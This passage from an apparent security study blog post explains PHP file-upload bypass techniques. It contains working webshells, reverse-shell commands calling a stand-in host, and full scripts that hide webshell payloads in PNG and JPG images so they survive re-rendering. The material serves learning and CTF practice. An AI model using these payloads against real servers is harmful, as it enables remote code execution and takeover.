class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="文件上传的成因"><a href="#文件上传的成因" class="headerlink" title="文件上传的成因"></a>文件上传的成因</h4><p>由于历史原因，早期服务器比较贵，用户上传的文件只能存放在web目录</p>
<h3 id="0x3-文件上传可能存在的漏洞"><a href="#0x3-文件上传可能存在的漏洞" class="headerlink" title="0x3 文件上传可能存在的漏洞"></a>0x3 文件上传可能存在的漏洞</h3><p>文件上传本质就是对服务器文件系统写操作，就有可能执行我们写入的恶意代码</p>
<h4 id="文件上传后缀黑名单过滤"><a href="#文件上传后缀黑名单过滤" class="headerlink" title="文件上传后缀黑名单过滤"></a>文件上传后缀黑名单过滤</h4><p>某些配置文件为了兼容老版本的php代码，也会解析php3，php5，phtml</p>
<h4 id="php文件上传的00截断"><a href="#php文件上传的00截断" class="headerlink" title="php文件上传的00截断"></a>php文件上传的00截断</h4><p>123.php%00.jpg保存时.jpg会被截断舍弃，但是只有PHP版本小于5.3.4才存在此漏洞</p>
<h4 id="iconv字符转换异常造成截断"><a href="#iconv字符转换异常造成截断" class="headerlink" title="iconv字符转换异常造成截断"></a>iconv字符转换异常造成截断</h4><p>5.4以上版本已经修复</p>
<h4 id="文件后缀白名单过滤"><a href="#文件后缀白名单过滤" class="headerlink" title="文件后缀白名单过滤"></a>文件后缀白名单过滤</h4><h5 id="web服务器解析漏洞"><a href="#web服务器解析漏洞" class="headerlink" title="web服务器解析漏洞"></a>web服务器解析漏洞</h5><h6 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h6><p>Windows系统下一般使用ISS作为web服务器，比较老版本会解析目录名字为xxx.asp等字符构成的目录。</p>
<h6 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h6><p>nginx配置错误</p>
<p>nginx会将后缀为123.txt/123.php的uri请求匹配到，误认为是php后缀</p>
<h6 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h6><p>如果上传1.php被禁止，可以上传1.php.charmersix ，charmersix后缀不识别，就会继续往前识别后缀。</p>
<h3 id="0x4文件上传高级利用"><a href="#0x4文件上传高级利用" class="headerlink" title="0x4文件上传高级利用"></a>0x4文件上传高级利用</h3><h4 id="配置文件绕过"><a href="#配置文件绕过" class="headerlink" title="配置文件绕过"></a>配置文件绕过</h4><h5 id="htaccess配置文件"><a href="#htaccess配置文件" class="headerlink" title=".htaccess配置文件"></a>.htaccess配置文件</h5><h5 id="user-ini配置文件"><a href="#user-ini配置文件" class="headerlink" title=".user.ini配置文件"></a>.user.ini配置文件</h5><p><code>auto_append_file=1.txt</code></p>
<p>使用auto_append_file参数来包含进行当前的php文件一起执行。</p>
<p>.user.ini自动附加文件时，当前目录必须要有php文件</p>
<p>配置文件必须要有php文件才能生效</p>
<p>直接访问首页，即可执行一句话木马</p>
<h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><p>像<code>&lt;?php , system , eval , $_GET, $_POST</code>如果这些函数被禁用，即文件中带有这些函数的文件都无法上传，我们可以使用cookie传输数据，或者用nc反弹shell</p>
<p>1.用cookie传输数据</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_COOKIE</span>[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure>

<p>`文件上传，然后cookie传输</p>
<p><code>echo &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b&quot;|base64 -d&gt;1.php</code></p>
<p>再连接1.php</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209112109336.png" alt="image-20220911210914228"></p>
<p>2.反弹shell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> `nc ip port -e /bin/sh`;</span><br><span class="line"><span class="meta">&lt;?=</span> `curl curl https:<span class="comment">//your-shell.com/ip:port |sh`;</span></span><br></pre></td></tr></table></figure>

<p>3.使用php伪协议，文件包含</p>
<p><code>auto_append_file=php://input</code></p>
<p>4.日志包含</p>
<p><code>auto_append_file=/var/log/nginx/access.log</code></p>
<p>注意.user.ini内容的文件名</p>
<h4 id="文件上传与XSS"><a href="#文件上传与XSS" class="headerlink" title="文件上传与XSS"></a>文件上传与XSS</h4><h4 id="图片上传"><a href="#图片上传" class="headerlink" title="图片上传"></a>图片上传</h4><h5 id="getimagesize绕过"><a href="#getimagesize绕过" class="headerlink" title="getimagesize绕过"></a>getimagesize绕过</h5><p>扫描图片中是否存在高宽，如果存在就认为正常</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define height 100</span></span><br><span class="line"><span class="comment">#define width 100</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="png二次渲染绕过"><a href="#png二次渲染绕过" class="headerlink" title="png二次渲染绕过"></a>png二次渲染绕过</h5><p>直接生成一个新图片，清洗掉原来的恶意代码</p>
<p>这里我们用脚本写一个恶意代码不会被清洗的图片</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="jpg二次渲染绕过"><a href="#jpg二次渲染绕过" class="headerlink" title="jpg二次渲染绕过"></a>jpg二次渲染绕过</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">用法  php exp.php a.png</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们来一个jpg二次渲染绕过的专用图片</p>
<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209271146879.jpg" alt="jpg_xr" style="zoom:33%;" />

<h4 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209112211613.png" alt="image-20220911221130575"></p>
<ul>
<li>文件上传最容易出现代码执行和命令执行，且危害巨大</li>
<li>配置文件.user.ini中，auto_append_file参数不仅可以写文件名，也可以是伪协议和nginx日志</li>
<li>getimagesize函数可以通过#define width 100来绕过</li>
<li>png和jpg二次渲染后，仍可能保留恶意代码</li>
</ul>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>PHP_upload</tag>
      </tags>
  </entry>
</search>
